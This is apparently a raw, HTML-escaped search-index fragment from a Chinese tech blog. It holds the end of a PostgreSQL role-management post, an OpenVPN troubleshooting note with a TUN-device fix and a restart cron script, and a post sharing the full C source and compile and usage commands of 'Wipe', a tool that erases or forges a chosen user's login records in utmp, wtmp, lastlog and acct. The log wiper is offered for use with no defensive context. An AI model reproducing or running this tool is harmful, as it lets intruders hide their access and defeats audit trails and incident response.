class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#推荐用psql来进行管理，有很多快捷键，navicat里面是没有的\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#没有的话就装一个\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install postgresql.x86_64\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epsql -h 10.8.2.61 -U admin \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#必用快捷键\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#列出所有的库\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\l\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#列出所有的schema\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\d\u003c/span\u003en\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#看schema.public权限\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\d\u003c/span\u003en+ public\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#列出所有的对象（table, view, sequences）\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\d\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#列出所有的角色\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\d\u003c/span\u003eu\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#列出所有表\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\d\u003c/span\u003et\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#列出所有索引\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\\d\u003c/span\u003ei\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#同样的sql\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eselect\u003c/span\u003e * from pg_roles\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#看看能登录的用户有哪些\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eselect\u003c/span\u003e * from pg_user\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e那自顶向下开始：\u003c/p\u003e","title":"PostgreSQL的用户权限管理"},{"content":"一些Openvpn问题：\n一、OpenVPN - ERROR: Cannot open TUN/TAP dev /dev/net/tun: No such file or directory (errno=2)\n没有tun设备，建一个就行：\nmkdir -p /dev/net mknod /dev/net/tun c 10 200 chmod 600 /dev/net/tun 二、vpn进程掉了\n加一个crontab，定时检测，没有就重启\n*/1 * * * * /usr/local/bin/vpn.sh cat /usr/local/bin/vpn.cn #!/bin/bash vpn_pid=$(ps ax|grep openvpn|grep -v grep|awk \u0026#39;{print $1}\u0026#39;) if [[ ! -n \u0026#34;$vpn_pid\u0026#34; ]]; then datetime=$(date +\u0026#34;%Y%m%d %H:%M:%S\u0026#34;) echo \u0026#34;Restart openvpn at $datetime\u0026#34; \u0026gt;\u0026gt; /tmp/r.txt sleep 5 /app/openvpn/sbin/openvpn --config /etc/openvpn/conf/client1.conf --daemon fi ","permalink":"https://rendoumi.com/posts/20240130-openvpn_problem/","summary":"\u003cp\u003e一些Openvpn问题：\u003c/p\u003e\n\u003cp\u003e一、OpenVPN - ERROR: Cannot open TUN/TAP dev /dev/net/tun: No such file or directory (errno=2)\u003c/p\u003e\n\u003cp\u003e没有tun设备，建一个就行：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emkdir -p /dev/net\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emknod /dev/net/tun c \u003cspan class=\"m\"\u003e10\u003c/span\u003e \u003cspan class=\"m\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod \u003cspan class=\"m\"\u003e600\u003c/span\u003e /dev/net/tun\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e二、vpn进程掉了\u003c/p\u003e\n\u003cp\u003e加一个crontab，定时检测，没有就重启\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e*/1 * * * * /usr/local/bin/vpn.sh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /usr/local/bin/vpn.cn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#!/bin/bash\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003evpn_pid\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003eps ax\u003cspan class=\"p\"\u003e|\u003c/span\u003egrep openvpn\u003cspan class=\"p\"\u003e|\u003c/span\u003egrep -v grep\u003cspan class=\"p\"\u003e|\u003c/span\u003eawk \u003cspan class=\"s1\"\u003e\u0026#39;{print $1}\u0026#39;\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e[[\u003c/span\u003e ! -n \u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"nv\"\u003e$vpn_pid\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e]]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"k\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nv\"\u003edatetime\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003edate +\u003cspan class=\"s2\"\u003e\u0026#34;%Y%m%d %H:%M:%S\u0026#34;\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"nb\"\u003eecho\u003c/span\u003e  \u003cspan class=\"s2\"\u003e\u0026#34;Restart openvpn at \u003c/span\u003e\u003cspan class=\"nv\"\u003e$datetime\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u0026gt;\u0026gt; /tmp/r.txt\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  sleep \u003cspan class=\"m\"\u003e5\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  /app/openvpn/sbin/openvpn --config /etc/openvpn/conf/client1.conf --daemon\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"k\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Openvpn 的一些问题"},{"content":"Linux下的日志擦除软件，无解释珍藏：\ngcc -O3 -DHAVE_LASTLOG_H -DNO_ACCT -o wipe wipe.c wipe u root #w 命令擦掉在线的root wipe w root #last 命令擦掉root wipe l root #lastlog 命令擦掉root登录记录 源码如下：\n/* * Wipe v1.00. * * Written by The Crawler. * * Selectively wipe system logs. * * Usage: wipe [l,u,w] username * ex: wipe l user;wipe u user;wipe w user * * Wipes logs on, but not including, Linux, FreeBSD, Sunos 4.x, Solaris 2.x, * Ultrix, AIX, IRIX, Digital UNIX, BSDI, NetBSD, HP/UX. * compile with -DHAVE_LASTLOG_H -DNO_ACCT */ #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #ifndef NO_ACCT #include \u0026lt;sys/acct.h\u0026gt; #endif #include \u0026lt;utmp.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;ctype.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;pwd.h\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #ifdef HAVE_LASTLOG_H #include \u0026lt;lastlog.h\u0026gt; #endif #ifdef HAVE_UTMPX #include \u0026lt;utmpx.h\u0026gt; #endif /* * Try to use the paths out of the include files. * But if we can\u0026#39;t find any, revert to the defaults. */ #ifndef UTMP_FILE #ifdef _PATH_UTMP #define UTMP_FILE\t_PATH_UTMP #else #define UTMP_FILE\t\u0026#34;/var/adm/utmp\u0026#34; #endif #endif #ifndef WTMP_FILE #ifdef _PATH_WTMP #define WTMP_FILE\t_PATH_WTMP #else #define WTMP_FILE\t\u0026#34;/var/adm/wtmp\u0026#34; #endif #endif #ifndef LASTLOG_FILE #ifdef _PATH_LASTLOG #define LASTLOG_FILE\t_PATH_LASTLOG #else #define LASTLOG_FILE\t\u0026#34;/var/adm/lastlog\u0026#34; #endif #endif #ifndef ACCT_FILE #define ACCT_FILE\t\u0026#34;/var/adm/pacct\u0026#34; #endif #ifdef HAVE_UTMPX #ifndef UTMPX_FILE #define UTMPX_FILE\t\u0026#34;/var/adm/utmpx\u0026#34; #endif #ifndef WTMPX_FILE #define WTMPX_FILE\t\u0026#34;/var/adm/wtmpx\u0026#34; #endif #endif /* HAVE_UTMPX */ #define BUFFSIZE\t8192 /* * This function will copy the src file to the dst file. */ void copy_file(char *src, char *dst) { int fd1, fd2; int\tn; char\tbuf[BUFFSIZE]; if ( (fd1 = open(src, O_RDONLY)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening %s during copy.\\n\u0026#34;, src); return; } if ( (fd2 = open(dst, O_WRONLY | O_CREAT | O_TRUNC)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Creating %s during copy.\\n\u0026#34;, dst); return; } while ( (n = read(fd1, buf, BUFFSIZE)) \u0026gt; 0) if (write(fd2, buf, n) != n) { fprintf(stderr, \u0026#34;ERROR: Write error during copy.\\n\u0026#34;); return; } if (n \u0026lt; 0) { fprintf(stderr, \u0026#34;ERROR: Read error during copy.\\n\u0026#34;); return; } close(fd1); close(fd2); } /* * UTMP editing. */ void wipe_utmp(char *who, char *line) { int fd1; struct utmp\tut; printf(\u0026#34;Patching %s .... \u0026#34;, UTMP_FILE); fflush(stdout); /* * Open the utmp file. */ if ( (fd1 = open(UTMP_FILE, O_RDWR)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, UTMP_FILE); return; } /* * Copy utmp file excluding relevent entries. */\twhile ( read(fd1, \u0026amp;ut, sizeof(ut)) \u0026gt; 0) if ( !strncmp(ut.ut_name, who, strlen(who)) ) if (!line || (line \u0026amp;\u0026amp; !strncmp(ut.ut_line, line, strlen(line)))) { bzero((char *) \u0026amp;ut, sizeof(ut)); lseek(fd1, (int) -sizeof(ut), SEEK_CUR); write(fd1, \u0026amp;ut, sizeof(ut)); } close(fd1); printf(\u0026#34;Done.\\n\u0026#34;); } /* * UTMPX editing if supported. */ #ifdef HAVE_UTMPX void wipe_utmpx(char *who, char *line) { int fd1; struct utmpx\tutx; printf(\u0026#34;Patching %s .... \u0026#34;, UTMPX_FILE); fflush(stdout); /* * Open the utmp file and temporary file. */ if ( (fd1 = open(UTMPX_FILE, O_RDWR)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, UTMPX_FILE); return; } while ( (read(fd1, \u0026amp;utx, sizeof(utx)) ) \u0026gt; 0) if ( !strncmp(utx.ut_name, who, strlen(who)) ) if (!line || (line \u0026amp;\u0026amp; !strncmp(utx.ut_line, line, strlen(line)))) { bzero((char *) \u0026amp;utx, sizeof(utx)); lseek(fd1, (int) -sizeof(utx), SEEK_CUR); write(fd1, \u0026amp;utx, sizeof(utx)); } close(fd1); printf(\u0026#34;Done.\\n\u0026#34;); } #endif /* * WTMP editing. */ void wipe_wtmp(char *who, char *line) { int\tfd1; struct utmp\tut; printf(\u0026#34;Patching %s .... \u0026#34;, WTMP_FILE); fflush(stdout); /* * Open the wtmp file and temporary file. */ if ( (fd1 = open(WTMP_FILE, O_RDWR)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, WTMP_FILE); return; } /* * Determine offset of last relevent entry. */ lseek(fd1, (long) -(sizeof(ut)), SEEK_END); while ( (read (fd1, \u0026amp;ut, sizeof(ut))) \u0026gt; 0) { if (!strncmp(ut.ut_name, who, strlen(who))) if (!line || (line \u0026amp;\u0026amp; !strncmp(ut.ut_line, line, strlen(line)))) { bzero((char *) \u0026amp;ut, sizeof(ut)); lseek(fd1, (long) -(sizeof(ut)), SEEK_CUR); write(fd1, \u0026amp;ut, sizeof(ut)); break; } lseek(fd1, (long) -(sizeof(ut) * 2), SEEK_CUR); } close(fd1); printf(\u0026#34;Done.\\n\u0026#34;); } /* * WTMPX editing if supported. */ #ifdef HAVE_UTMPX void wipe_wtmpx(char *who, char *line) { int fd1; struct utmpx\tutx; printf(\u0026#34;Patching %s .... \u0026#34;, WTMPX_FILE); fflush(stdout); /* * Open the utmp file and temporary file. */ if ( (fd1 = open(WTMPX_FILE, O_RDWR)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, WTMPX_FILE); return; } /* * Determine offset of last relevent entry. */ lseek(fd1, (long) -(sizeof(utx)), SEEK_END); while ( (read (fd1, \u0026amp;utx, sizeof(utx))) \u0026gt; 0) { if (!strncmp(utx.ut_name, who, strlen(who))) if (!line || (line \u0026amp;\u0026amp; !strncmp(utx.ut_line, line, strlen(line)))) { bzero((char *) \u0026amp;utx, sizeof(utx)); lseek(fd1, (long) -(sizeof(utx)), SEEK_CUR); write(fd1, \u0026amp;utx, sizeof(utx)); break; } lseek(fd1, (int) -(sizeof(utx) * 2), SEEK_CUR); } close(fd1); printf(\u0026#34;Done.\\n\u0026#34;); } #endif /* * LASTLOG editing. */ void wipe_lastlog(char *who, char *line, char *timestr, char *host) { int\tfd1; struct lastlog\tll; struct passwd\t*pwd; struct tm\t*tm; char\tstr[4]; printf(\u0026#34;Patching %s .... \u0026#34;, LASTLOG_FILE); fflush(stdout); tm = (struct tm *) malloc( sizeof(struct tm) ); /* * Open the lastlog file. */ if ( (fd1 = open(LASTLOG_FILE, O_RDWR)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, LASTLOG_FILE); return; } if ( (pwd = getpwnam(who)) == NULL) { fprintf(stderr, \u0026#34;ERROR: Can\u0026#39;t find user in passwd.\\n\u0026#34;); return; } lseek(fd1, (long) pwd-\u0026gt;pw_uid * sizeof(struct lastlog), 0); bzero((char *) \u0026amp;ll, sizeof(ll)); if (line) strncpy(ll.ll_line, line, strlen(line)); if (timestr) { /* YYMMddhhmm */ if (strlen(timestr) != 10) { fprintf(stderr, \u0026#34;ERROR: Time format is YYMMddhhmm.\\n\u0026#34;); return; } /* * Extract Times. */ str[2] = 0; str[0] = timestr[0]; str[1] = timestr[1]; tm-\u0026gt;tm_year = atoi(str); str[0] = timestr[2]; str[1] = timestr[3]; tm-\u0026gt;tm_mon = atoi(str) - 1; str[0] = timestr[4]; str[1] = timestr[5]; tm-\u0026gt;tm_mday = atoi(str); str[0] = timestr[6]; str[1] = timestr[7]; tm-\u0026gt;tm_hour = atoi(str); str[0] = timestr[8]; str[1] = timestr[9]; tm-\u0026gt;tm_min = atoi(str); tm-\u0026gt;tm_sec = 0; ll.ll_time = mktime(tm); } if (host) strncpy(ll.ll_host, host, sizeof(ll.ll_host)); write(fd1, (char *) \u0026amp;ll, sizeof(ll)); close(fd1); printf(\u0026#34;Done.\\n\u0026#34;); } #ifndef NO_ACCT /* * ACCOUNT editing. */ void wipe_acct(char *who, char *line) { int\tfd1, fd2; struct acct\tac; char\tttyn[50]; struct passwd *pwd; struct stat\tsbuf; char\t*tmpf; printf(\u0026#34;Patching %s .... \u0026#34;, ACCT_FILE); fflush(stdout); /* * Open the acct file and temporary file. */ if ( (fd1 = open(ACCT_FILE, O_RDONLY)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening %s\\n\u0026#34;, ACCT_FILE); return; } /* * Grab a unique temporary filename. */ tmpf = tmpnam((char *) NULL); if ( (fd2 = open(tmpf, O_WRONLY | O_CREAT | O_TRUNC, 600)) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Opening tmp ACCT file\\n\u0026#34;); return; } if ( (pwd = getpwnam(who)) == NULL) { fprintf(stderr, \u0026#34;ERROR: Can\u0026#39;t find user in passwd.\\n\u0026#34;); return; } /* * Determine tty\u0026#39;s device number */ strcpy(ttyn, \u0026#34;/dev/\u0026#34;); strcat(ttyn, line); if (stat(ttyn, \u0026amp;sbuf) \u0026lt; 0) { fprintf(stderr, \u0026#34;ERROR: Determining tty device number.\\n\u0026#34;); return; } while ( read(fd1, \u0026amp;ac, sizeof(ac)) \u0026gt; 0 ) { if ( !(ac.ac_uid == pwd-\u0026gt;pw_uid \u0026amp;\u0026amp; ac.ac_tty == sbuf.st_rdev) )\twrite(fd2, \u0026amp;ac, sizeof(ac)); } close(fd1); close(fd2); copy_file(tmpf, ACCT_FILE); if ( unlink(tmpf) \u0026lt; 0 ) { fprintf(stderr, \u0026#34;ERROR: Unlinking tmp WTMP file.\\n\u0026#34;); return; } printf(\u0026#34;Done.\\n\u0026#34;); } #endif void usage() { printf(\u0026#34;USAGE: wipe [ u|w|l|a ] ...options...\\n\u0026#34;); printf(\u0026#34;\\n\u0026#34;); printf(\u0026#34;UTMP editing:\\n\u0026#34;); printf(\u0026#34; Erase all usernames : wipe u [username]\\n\u0026#34;); printf(\u0026#34; Erase one username on tty: wipe u [username] [tty]\\n\u0026#34;); printf(\u0026#34;\\n\u0026#34;); printf(\u0026#34;WTMP editing:\\n\u0026#34;); printf(\u0026#34; Erase last entry for user : wipe w [username]\\n\u0026#34;); printf(\u0026#34; Erase last entry on tty : wipe w [username] [tty]\\n\u0026#34;); printf(\u0026#34;\\n\u0026#34;);\tprintf(\u0026#34;LASTLOG editing:\\n\u0026#34;); printf(\u0026#34; Blank lastlog for user : wipe l [username]\\n\u0026#34;); printf(\u0026#34; Alter lastlog entry : wipe l [username] [tty] [time] [host]\\n\u0026#34;); printf(\u0026#34;\tWhere [time] is in the format [YYMMddhhmm]\\n\u0026#34;); printf(\u0026#34;\\n\u0026#34;); #ifndef NO_ACCT printf(\u0026#34;ACCT editing:\\n\u0026#34;); printf(\u0026#34; Erase acct entries on tty : wipe a [username] [tty]\\n\u0026#34;); #endif exit(1); } int main(int argc, char *argv[]) { char\tc; if (argc \u0026lt; 3) usage(); /* * First character of first argument determines which file to edit. */ c = toupper(argv[1][0]); /* * UTMP editing. */ switch (c) { /* UTMP */ case \u0026#39;U\u0026#39; : if (argc == 3) wipe_utmp(argv[2], (char *) NULL); if (argc ==4) wipe_utmp(argv[2], argv[3]); #ifdef HAVE_UTMPX if (argc == 3) wipe_utmpx(argv[2], (char *) NULL); if (argc == 4) wipe_utmpx(argv[2], argv[3]); #endif break; /* WTMP */ case \u0026#39;W\u0026#39; : if (argc == 3) wipe_wtmp(argv[2], (char *) NULL); if (argc == 4) wipe_wtmp(argv[2], argv[3]); #ifdef HAVE_UTMPX if (argc == 3) wipe_wtmpx(argv[2], (char *) NULL); if (argc == 4) wipe_wtmpx(argv[2], argv[3]); #endif break; /* LASTLOG */ case \u0026#39;L\u0026#39; : if (argc == 3) wipe_lastlog(argv[2], (char *) NULL, (char *) NULL, (char *) NULL); if (argc == 4) wipe_lastlog(argv[2], argv[3], (char *) NULL, (char *) NULL); if (argc == 5) wipe_lastlog(argv[2], argv[3], argv[4], (char *) NULL); if (argc == 6) wipe_lastlog(argv[2], argv[3], argv[4], argv[5]); break; #ifndef NO_ACCT /* ACCT */ case \u0026#39;A\u0026#39; : if (argc != 4) usage(); wipe_acct(argv[2], argv[3]); break; #endif } return(0); } ","permalink":"https://rendoumi.com/posts/20240129-wipe_linux/","summary":"\u003cp\u003eLinux下的日志擦除软件，无解释珍藏：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egcc -O3  -DHAVE_LASTLOG_H -DNO_ACCT -o wipe wipe.c\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewipe u root \u003cspan class=\"c1\"\u003e#w 命令擦掉在线的root\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewipe w root \u003cspan class=\"c1\"\u003e#last 命令擦掉root\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewipe l root \u003cspan class=\"c1\"\u003e#lastlog 命令擦掉root登录记录\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e源码如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-c\" data-lang=\"c\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * Wipe v1.00.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e *\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * Written by The Crawler.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e *\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * Selectively wipe system logs.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e *\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * Usage: wipe [l,u,w] username\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * ex:    wipe l user;wipe u user;wipe w user\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e *\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * Wipes logs on, but not including, Linux, FreeBSD, Sunos 4.x, Solaris 2.x,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e *      Ultrix, AIX, IRIX, Digital UNIX, BSDI, NetBSD, HP/UX.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * compile with  -DHAVE_LASTLOG_H -DNO_ACCT */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;sys/types.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;sys/stat.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#include\u003c/span\u003e \u003cspan class=\"cpf\"\u003e\u0026lt;sys/uio.h\u0026gt;\u003c/span\u003e\u003cspan class=\"cp\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan 